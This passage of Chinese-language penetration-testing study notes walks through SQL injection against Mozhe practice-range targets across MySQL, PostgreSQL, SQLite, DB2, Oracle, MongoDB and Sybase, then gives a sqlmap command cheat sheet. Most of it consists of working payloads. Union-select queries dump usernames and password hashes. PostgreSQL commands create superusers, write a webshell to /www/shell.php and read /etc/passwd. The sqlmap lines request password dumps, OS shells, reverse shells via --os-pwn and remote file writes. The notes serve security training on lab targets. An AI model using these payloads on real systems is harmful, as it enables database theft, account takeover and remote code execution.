<li>获取数据库名：<a href="http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,database(),4">http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,database(),4</a><ul>
<li>得到：mozhe_Discuz_StormGroup</li>
</ul>
</li>
<li>获取一个表名：219.153.49.228:43902/new_list.php?id=-1 union select 1,2,table_name,4 from information_schema.tables where table_schema = “mozhe_Discuz_StormGroup”<ul>
<li><img src="/source/images/image-20210729123659999.png" alt="image-20210729123659999"></li>
</ul>
</li>
<li>获取所有表名：group_concat(table_name)<ul>
<li>219.153.49.228:43902/new_list.php?id=-1 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema = “mozhe_Discuz_StormGroup”</li>
<li><img src="/source/images/image-20210729124115953.png" alt="image-20210729124115953"></li>
</ul>
</li>
<li>获取所有列名<ul>
<li>这里根据上面查到的表，可以发现表StormGroup_member是存储用户数据的，所以我们就获取它里面的列</li>
<li><a href="http://219.153.49.228:43902/new_list.php?id=-1">http://219.153.49.228:43902/new_list.php?id=-1</a> union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema = “mozhe_Discuz_StormGroup”</li>
<li>易错点：这里因为information_schema.columns里储存了所有的列，所以需要将information_schema.tables换成information_schema.columns</li>
<li><img src="/source/images/image-20210729124808993.png" alt="image-20210729124808993"></li>
</ul>
</li>
<li>获取数据：<a href="http://219.153.49.228:43902/new_list.php?id=-1">http://219.153.49.228:43902/new_list.php?id=-1</a> union select 1,password,name,4 from StormGroup_member<ul>
<li>易错点：这里直接填上字段，然后后面跟上from + 表名即可</li>
<li><img src="/source/images/image-20210729125307489.png" alt="image-20210729125307489"></li>
</ul>
</li>
<li>密码进行md5解密，得到：mozhe   738426<ul>
<li>注意，因为这个获取到的账号被禁用了，所以我们可以使用group_concat()获取所有的账户和密码，发现第二个账户和密码可以成功登录</li>
<li><a href="http://219.153.49.228:43902/new_list.php?id=-1">http://219.153.49.228:43902/new_list.php?id=-1</a> union select 1,group_concat(password),group_concat(name),4 from StormGroup_member</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>SQL注入-PostgreSQL同理联合注入：和mysql类似</p>
<ul>
<li><p>特性：</p>
<ul>
<li><p>select 的1,2,3,4   全部换成null</p>
</li>
<li><p>select null,null,null,null   并不会显示显示位，而是页面正常显示，所以在插入查询语句，比如version() 需要在4个null的位置进行测试，看哪个位置会爆出数据（前提：union前面的语句要置错）</p>
</li>
</ul>
</li>
<li><p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Postgresql是一款中小型数据库，经常与PHP一起使用。</span><br><span class="line"></span><br><span class="line">数据库判断</span><br><span class="line">+<span class="keyword">and</span>+<span class="number">1</span>::<span class="built_in">int</span>=<span class="number">1</span>-</span><br><span class="line">返回正常即为Postgresql数据库</span><br><span class="line"></span><br><span class="line">常用注入语句</span><br><span class="line">数据库版本</span><br><span class="line">+<span class="keyword">and</span>+<span class="number">1</span>=cast(version() <span class="keyword">as</span> <span class="built_in">int</span>)-</span><br><span class="line">判断当前用户</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=cast(user||<span class="number">123</span> <span class="keyword">as</span> <span class="built_in">int</span>)</span><br><span class="line">判断字段数</span><br><span class="line">order by</span><br><span class="line">联合注入</span><br><span class="line">用法和oracle相似</span><br><span class="line"></span><br><span class="line">数据库版本信息</span><br><span class="line">union select null,version(),null </span><br><span class="line">用户权限</span><br><span class="line">union select null,current_schema(),null</span><br><span class="line">数据库名称</span><br><span class="line">union select null,current_database(),null</span><br><span class="line">表名</span><br><span class="line">union select null,relname,null <span class="keyword">from</span> pg_stat_user_tables</span><br><span class="line">列名</span><br><span class="line">union select null,column_name,null <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;表名&#x27;</span></span><br><span class="line">查看数据库账号密码</span><br><span class="line">union select null,usename|char(<span class="number">124</span>)|passwd,null <span class="keyword">from</span> pg_shadow</span><br><span class="line">||连接字符串</span><br><span class="line"></span><br><span class="line">char(<span class="number">124</span>)为|</span><br><span class="line"></span><br><span class="line">获得结果例子：admin|password</span><br><span class="line"></span><br><span class="line">创建用户</span><br><span class="line">;create user test <span class="keyword">with</span> superuser password <span class="string">&#x27;test&#x27;</span>-- </span><br><span class="line">修改postgres的用户密码为<span class="keyword">pass</span></span><br><span class="line">;alter user postgres <span class="keyword">with</span> password <span class="string">&#x27;pass&#x27;</span></span><br><span class="line">写shell</span><br><span class="line">方法一</span><br><span class="line">依次执行如下三个命令</span><br><span class="line"></span><br><span class="line">;create  table shell(shell text <span class="keyword">not</span> null);</span><br><span class="line">;insert into shell values(一句话木马);</span><br><span class="line">;copy shell(shell) to <span class="string">&#x27;/www/shell.php&#x27;</span>;</span><br><span class="line">这样就会将一句话木马写到，www目录下的shell.php文件中</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">;copy (select <span class="string">&#x27;一句话木马&#x27;</span>) to <span class="string">&#x27;/www/shell/php&#x27;</span>;</span><br><span class="line">读文件</span><br><span class="line">pg_read_file(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="number">1</span>,<span class="number">20</span>)	<span class="comment">#读文件前20行</span></span><br></pre></td></tr></table></figure></li>
<li><p>实战墨者靶场：<a href="https://www.mozhe.cn/bug/detail/86">SQL手工注入漏洞测试(PostgreSQL数据库)_SQL注入_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a></p>
<ul>
<li><p><a href="http://219.153.49.228:47981/new_list.php?id=1">http://219.153.49.228:47981/new_list.php?id=1</a> order by 4      字段数为4</p>
</li>
<li><p>查询数据库版本：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,version(),null</p>
</li>
<li><p>查询数据库名：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,current_database(),null</p>
<ul>
<li>得到数据库名：mozhedvcms</li>
</ul>
</li>
<li><p>查询表名：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,relname,null from pg_stat_user_tables</p>
<ul>
<li>获取到的表名 notice,这样默认获取到的是第一个表名</li>
<li>易错点：该语句固定搭配，不需要修改</li>
</ul>
</li>
<li><p>获取所有的表名：逐个获取，通过修改offset后面的数字，0，1，2，3….  获取所有的表名</p>
<ul>
<li><a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,relname,null from pg_stat_user_tables limit 1 offset 0</li>
<li>获取的表名如下：notice    reg_users   </li>
</ul>
</li>
<li><p>查询列名：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,column_name,null from information_schema.columns where table_name=’reg_users’               得到列：id</p>
<ul>
<li>易错点：该语句需要修改上一步获取到的表名 reg_users，这里默认获取到的是第一个列名</li>
</ul>
</li>
<li><p>获取所有的列名：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,column_name,null from information_schema.columns where table_name=’reg_users’     limit 1 offset 0</p>
<ul>
<li>获取到的列名：id  name  password  status</li>
</ul>
</li>
<li><p>获取账号和密码：</p>
<ul>
<li><a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,name,null from reg_users  获取到账号为：mozhe2</li>
<li><a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,password,null from reg_users获取到的密码为：1c63129ae9db9c60c3e8aa94d3e00495  解密后值为：1c63129ae9db9c60c3e8aa94d3e00495</li>
<li><img src="/source/images/image-20210729154748904.png" alt="image-20210729154748904"></li>
<li><img src="/source/images/image-20210729154740600.png" alt="image-20210729154740600"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="14-、SQLite-amp-Mongodb-amp-Oracle-amp-DB2"><a href="#14-、SQLite-amp-Mongodb-amp-Oracle-amp-DB2" class="headerlink" title="14 、SQLite&amp;Mongodb&amp;Oracle&amp;DB2"></a>14 、SQLite&amp;Mongodb&amp;Oracle&amp;DB2</h2><p>#案例1-SQLite注入</p>
<p><a href="https://www.cnblogs.com/xiaozi/p/5760321.html">https://www.cnblogs.com/xiaozi/p/5760321.html</a></p>
<p>通常sqlite文件中会包含一个sqlite_master隐藏表</p>
<p>​    <img src="/source/images/image-20210729164800102.png" alt="image-20210729164800102"></p>
<p>这里记录着你建表留下的记录，我们可以查看这个表名来看这些数据，比如通过上面的图片我们可以发现存在Test表和字段id,name两个字段</p>
<p>那么怎么查询数据呢？</p>
<ul>
<li>首先查询字段长度：order by 4</li>
<li>联合查询爆出显示位   union select 1,2,3,4</li>
<li>在显示位插入查询语句：union select 1,name,sql,4 from sqlite_master<ul>
<li>可以看到，通过查询sqlite_master隐藏表里的字段name和sql即可获取该数据库里的表的名字Test和该Test表下的字段id，name</li>
</ul>
</li>
<li>获取账号和密码：union select 1,name,password,4 from WSTMart_reg     <ul>
<li>这里的name和password就是从sqlite_master隐藏表的字段sql里查询得到的，WSTMart_reg    则是从隐藏表sqlite_master的字段name里查到的</li>
</ul>
</li>
</ul>
<p>#案例2-DB2联合注入</p>
<ul>
<li>特性：和mysql大致类似，只是一些名称不一样，有一个</li>
</ul>
<p>tabschema：数据库名 current schema：数据库名的列名</p>
<p>table_name：表名 tabname：表名的列名</p>
<p>column_name：列名的列名</p>
<p>sysibm.sysdummy1 记录数据库名的信息</p>
<p>syscat.tables：记录表名的信息</p>
<p>sysibm.columns：记录列名的信息</p>
<p>1、猜数</p>
<p>order by 4</p>
<p>union select 1,2,3,4 from sysibm.systables</p>
<ul>
<li>易错点：在爆显示位的时候必须要加上后面的sysibm.systables  才能爆出显示位</li>
</ul>
<p>2、爆库：</p>
<p>union select 1,2,current schema,4 from sysibm.sysdummy1</p>
<p>3、爆表：</p>
<p>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 0,1</p>
<p>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 1,1</p>
<p>4、爆列：</p>
<p>union select 1,2,column_name,4 from sysibm.columns where table_schema=current schema and table_name=’GAME_CHARACTER’ limit 0,1</p>
<ul>
<li>易错点：之所以加一个将数据库名加上，就是为了防止多个数据库有相同的表名，防止数据魂断</li>
</ul>
<p>5、爆数据：</p>
<p>union select 1,name,password,4 from GAME_CHARACTER limit 0,1</p>
<p>union select 1,name,password,4 from GAME_CHARACTER limit 1,1</p>
<ul>
<li>查询表GAME_CHARACTER里的账号和密码</li>
</ul>
<p>#案例3-Oracle联合注入</p>
<p><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p>
<p><a href="https://blog.csdn.net/qq_35569814/article/details/100517122">https://blog.csdn.net/qq_35569814/article/details/100517122</a></p>
<p>all_tables 查询出所有的表</p>
<p>user_tables 查询出当前用户的表</p>
<p>all_tab_columns 查询出所有的字段</p>
<p>user_tab_columns  查询出当前用户的字段</p>
<p>v$version 查版本</p>
<p>1.查询个数</p>
<p>order by 2</p>
<p>2.查询表名格式</p>
<ul>
<li>易错点：<ul>
<li>可以是数字1,2,3等，也可以是null</li>
<li>需要先判断null是数字类型还是字符类型<ul>
<li>首先将第一个null用单引号引起来，’null’，如果页面正常，则是字符型，如果页面错误，则是数字型</li>
<li>如果第一个null是字符型<ul>
<li>那么就开始测第二个null，同时第一个null还是用单引号引起来’null’，在测第二个null，将第二个null用单引号引起来，看他是不是字符型，如果是，则继续用单引号引起来，以此类推<ul>
<li>union select ‘null’,’null’ from dual    此处如果页面正常，那么两个null都是字符型，必须都要用单引号引起来</li>
</ul>
</li>
</ul>
</li>
<li>如果第一个null是数字型<ul>
<li>那么第一个null则不需要单引号，开始测第二个null，首先加单引号，如果页面正常，则第二个null要用单引号引起来，则最终的语句是：union select null,’null’ from dual</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>union select null,null from dual    #两个null都是数字型</p>
<p>union select ‘null’,null from dual   #第一个null是字符型，第二个null是数字型</p>
<p>union select ‘null’,’null’ from dual    #两个null都是数字型</p>
<p>3.查询获取表名(筛选,搜索)</p>
<p>union select ‘1’,(select table_name from user_tables where rownum=1) from dual</p>
<ul>
<li>获取表名</li>
</ul>
<p>union select ‘1’,(select table_name from user_tables where rownum=1 and table_name not in ‘LOGMNR_SESSION_EVOLVE$’) from dual</p>
<ul>
<li>获取和第一个表不一样的表名，通过and 和not in来逐个爆出来</li>
</ul>
<p>union select ‘1’,(select table_name from user_tables where rownum=1 and table_name like ‘%user%’) from dual</p>
<ul>
<li>获取表名，并且该表名里有关键字：user</li>
</ul>
<p>4.查询获取列名</p>
<p>union select ‘1’,(select column_name from user_tab_columns where rownum=1 and table_name=’sns_users’) from dual</p>
<ul>
<li>获取表sns_user所对应的字段</li>
</ul>
<p>union select ‘1’,(select column_name from user_tab_columns where rownum=1 and table_name=’sns_users’ and column_name not in ‘USER_NAME’)  from dual</p>
<ul>
<li>获取表sns_user所对应的字段，并且该字段能是上一个句子爆出来的字段，通过此方法遍历所有的字段</li>
</ul>
<p>5.获取指定表名列名数据</p>
<p>union select user_name,user_pwd from “sns_users”</p>
<ul>
<li>获取账号和密码，假设获取到的账号为  hu</li>
</ul>
<p>union select user_name,user_pwd from “sns_users” where user_name&lt;&gt;’hu’</p>
<ul>
<li>获取账号不为 hu  的其余的账号和密码，   &lt;&gt;   的意思是不等于的意思</li>
</ul>
<p>union select user_name,user_pwd from “sns_users” where user_name=’mozhe’</p>
<ul>
<li>获取账号为 mozhe的的密码</li>
</ul>
<p>#案例4-Mongodb闭合注入</p>
<ul>
<li><p>应用场景：一般应用于ctf或者python开发的web环境中</p>
</li>
<li><p>特性：返回的是json的格式,sqlmap不支持该数据库</p>
</li>
<li><p>注入步骤</p>
<p>1.获取回显数字</p>
<p>‘}); return ({title:1,content:’2</p>
<ul>
<li><p>因为Mongodb和其他数据库的格式不一样，需要闭合</p>
<ul>
<li><p>如果不闭合，我们的语句会被当做字符串</p>
<ul>
<li><img src="/source/images/image-20210729174705548.png" alt="image-20210729174705548"></li>
</ul>
</li>
<li><p>闭合后的效果：</p>
<ul>
<li><img src="/source/images/image-20210729174730745.png" alt="image-20210729174730745"></li>
</ul>
</li>
<li><p>查询语句只需要插在回显位置即可，比如上图中的回显位置就在1那里</p>
</li>
</ul>
</li>
</ul>
<p>2.爆库</p>
<p>db返回的是数组，库名，需要用tojson转换为字符串</p>
<p>‘}); return ({title:tojson(db),content:’2</p>
<ul>
<li>查询数据库名</li>
</ul>
<p>3.爆表</p>
<p>db.getCollectionNames()返回的是数组，需要用tojson转换为字符串</p>
<p>‘}); return ({title:tojson(db.getCollectionNames()),content:’2</p>
<ul>
<li>db.getCollectionNames()代表获取该数据库的所有表，这里获取到的是Authority_confidential表</li>
</ul>
<p>4.爆列及数据</p>
<p>db.Authority_confidential是当前用的集合（表），</p>
<p>find函数用于查询，0是第一条数据</p>
<p>‘}); return ({title:tojson(db.Authority_confidential.find()[0]),content:’1</p>
<ul>
<li>获取当前数据库的Authority_confidential表的字段，查找第一个字段，find()[0]</li>
</ul>
<p>‘}); return ({title:tojson(db.Authority_confidential.find()[1]),content:’1</p>
<ul>
<li>获取当前数据库的Authority_confidential表的字段，查找第2个字段，find()[1]</li>
</ul>
</li>
</ul>
<h2 id="15-、Sybase-amp-Mssql-amp-Sqlmap-amp-Tamper"><a href="#15-、Sybase-amp-Mssql-amp-Sqlmap-amp-Tamper" class="headerlink" title="15 、Sybase&amp;Mssql&amp;Sqlmap&amp;Tamper"></a>15 、Sybase&amp;Mssql&amp;Sqlmap&amp;Tamper</h2><p>案例1-SQL注入-Sybase手工联合注入</p>
<ul>
<li>```python<br>1.猜个数<br>order by 4<br>2.猜显位:从第一个null开始给他用单引号引起来，如果显示正常，则代表第一个null是显示位，如果不正常，那么去掉第一个null的单引号，将第二个null引起来，然后观察页面是否正常，依此类推。。。<br>注意事项：<pre><code>1、整个union语句中，只能存在一个被单引号引起来的null
2、union和select之间有一个all，千万不能少
</code></pre>
union all select ‘null’,null,null,null<br>union all select null,’null’,null,null 显示null证明显示位为2<br>union all select null,null,’null’,null<br>union all select null,null,null,’null’<br>3.猜库名<br>union all select null,db_name(),null,null<br>union all select null,db_name(1),null,null<br>union all select null,db_name(2),null,null<br>4.猜表名：这里的mozhe_Deepthroat是上一步获取到的数据库名，而  .dbo.sysobjects 是固定搭配，这里面储存着所有的表<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;’Deepthroat_login’<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;’Deepthroat_login’ and name&lt;&gt;’notice’<br>5.猜列名：注意，才列名的时候，填充在null的位置的关键字也是name，而 .dbo.syscolumns 里储存了所有的列<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.syscolumns where id=object_id(‘Deepthroat_login’)  #此处是通过id=object_id(‘Deepthroat_login’) 来对条件进行限定，就是只获取表Deepthroat_login里的列<br>union all select null,name,null,null from mozhe_Deepthroat.syscolumns where id=object_id(‘Deepthroat_login’) and name&lt;&gt;’id’<br>union all select null,name,null,null from mozhe_Deepthroat.syscolumns where id=object_id(‘Deepthroat_login’) and name&lt;&gt;’id’ and name&lt;&gt;’name’    #这里的  &lt;&gt;代表不等于，表示获取表Deepthroat_login里的字段，并且要求该字段不为 id 和 name<br>6.获取数据<br>union all select null,name,null,null from Deepthroat_login    #此处的name是上一步获取到的字段 name<br>union all select null,password,null,null from Deepthroat_login<br>union all select null,password,null,null from Deepthroat_login where name&lt;&gt;’zhang’   #获取除了账号zhang之外的密码<br>union all select null,password,null,null from Deepthroat_login where name=’mozhe’<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例2-SQLMAP-下载&amp;安装&amp;使用&amp;说明</span><br><span class="line"></span><br><span class="line">https://www.python.org/downloads/</span><br><span class="line"></span><br><span class="line">https://github.com/sqlmapproject/sqlmap</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_21500173/article/details/53648696</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-SQLMAP-Sybase&amp;Mysql&amp;SQLite</span><br><span class="line"></span><br><span class="line">sqlmap基础命令讲解：</span><br><span class="line"></span><br><span class="line">- 易错点：如果在用sqlmap注入一个网站，发现换了一个目标识别出了数据库名字，并且该名字和上一次的结果一样，但是当执行--tables的时候又是500错误，那么可能就是缓存的原因了，需要删除缓存再开始注入，缓存文件地址：C:\Users\painter\AppData\Local\sqlmap\output     直接将output目录下的文件夹删除即可</span><br><span class="line">  - ![image-20210730112640774](/source/images/image-20210730112640774.png)</span><br><span class="line"></span><br><span class="line">- </span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">	#SQLMAP基本操作笔记：</span><br><span class="line">-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;#列出mysql数据库中的user表的所有字段</span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads 　　  #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line">常用语句 :</span><br><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span><br><span class="line">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span><br><span class="line">20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;简单的注入流程 :</span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><pre><code class="python">Sqlmap-Sybase 注入
--dbs       #获取所有数据库名                    
--current-db    #获取当前数据库
--tables -D &quot;mozhe_Deepthroat&quot;     #跑表
--columns -D &quot;mozhe_Deepthroat&quot; -T Deepthroat_login   #跑字段
--dump -C &quot;name,password&quot; -D &quot;mozhe_Deepthroat&quot; -T Deepthroat_login     #获取数据
Sqlmap-Mysql
--dbs                        
--current-db                                            
--tables -D mozhe_Discuz_StormGroup
--columns -T StormGroup_member -D mozhe_Discuz_StormGroup
--dump -C &quot;name,password&quot; -T StormGroup_member -D mozhe_Discuz_StormGroup

Sqlmap-SQLite
